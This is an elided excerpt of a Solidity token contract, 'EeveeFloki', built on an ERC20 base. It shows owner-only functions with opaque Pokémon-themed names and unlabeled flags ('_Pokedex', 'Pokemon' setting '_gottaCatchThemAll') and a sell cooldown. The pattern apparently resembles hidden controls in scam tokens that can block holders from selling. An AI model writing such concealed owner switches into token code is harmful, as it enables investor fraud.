...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _Pokedex(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _cooldownBeforeNewSell(address account, uint256 amount) internal virtual { 
        if ((block.timestamp - amount) > 15*60) {
            IsCDActiveOrNot[account] = false;
        }
    }
    
    function Pokemon() external onlyOwner() {
        _gottaCatchThemAll = true;
    }
}

contract ERC20Eevee is Context, ERC20 {
    constructor(
...
contract EeveeFloki is ERC20Eevee {
    constructor() ERC20Eevee("EeveeFloki", "EEVEE", false, true, 1100, 25, msg.sender, 50000000000 * 10 ** 18, msg.sender, 3) {
    }
}